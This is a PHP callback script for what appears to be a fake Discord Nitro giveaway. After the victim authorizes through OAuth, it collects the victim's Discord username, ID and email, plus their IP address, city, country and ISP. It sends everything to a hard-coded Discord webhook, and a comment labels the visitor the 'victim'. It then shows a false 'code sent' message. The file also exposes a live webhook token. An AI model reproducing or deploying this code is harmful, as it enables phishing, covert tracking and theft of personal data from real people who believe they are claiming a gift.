<?php
// ---- KONFİG ----
$client_id = "1518198703305785384";  // SENİN CLIENT ID'N
$client_secret = "GİZLİ"; // ★ KENDİ CLIENT SECRET'İNİ BURAYA YAZ ★
$redirect_uri = "https://nitro-4.onrender.com/discord_callback.php";
$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";

// Yetki kodu kontrolü
if (!isset($_GET['code'])) {
    die("❌ Yetki kodu alınamadı.");
}
$code = $_GET['code'];

// ---- Access Token Al ----
$token_url = "https://discord.com/api/oauth2/token";
$post_data = [
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $token_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
$response = curl_exec($ch);
curl_close($ch);

$token_data = json_decode($response, true);
if (!isset($token_data['access_token'])) {
    die("❌ Token alınamadı.");
}
$access_token = $token_data['access_token'];

// ---- Kullanıcı Bilgilerini Al ----
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/users/@me");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer " . $access_token]);
$user_response = curl_exec($ch);
curl_close($ch);

$user_data = json_decode($user_response, true);
if (!isset($user_data['id'])) {
    die("❌ Kullanıcı bilgileri alınamadı.");
}

// ---- IP ve Konum ----
$ip = $_SERVER['REMOTE_ADDR'];
$konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);

// ---- RAPORU WEBHOOK'A GÖNDER ----
$mesaj = "**🎯 YENİ GİRİŞ!**\n";
$mesaj .= "👤 " . ($user_data['username'] ?? 'Bilinmiyor') . "#" . ($user_data['discriminator'] ?? '0000') . "\n";
$mesaj .= "🆔 " . ($user_data['id'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "📧 " . ($user_data['email'] ?? 'Gizli') . "\n";
$mesaj .= "🌐 IP: {$ip}\n";
$mesaj .= "📍 " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "🏢 " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";

$payload = json_encode(["content" => $mesaj]);
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($ch);
curl_close($ch);

// ---- Kurbana Göster ----
echo "<h1>✅ Kod gönderildi! DM'ni kontrol et.</h1>";
?>
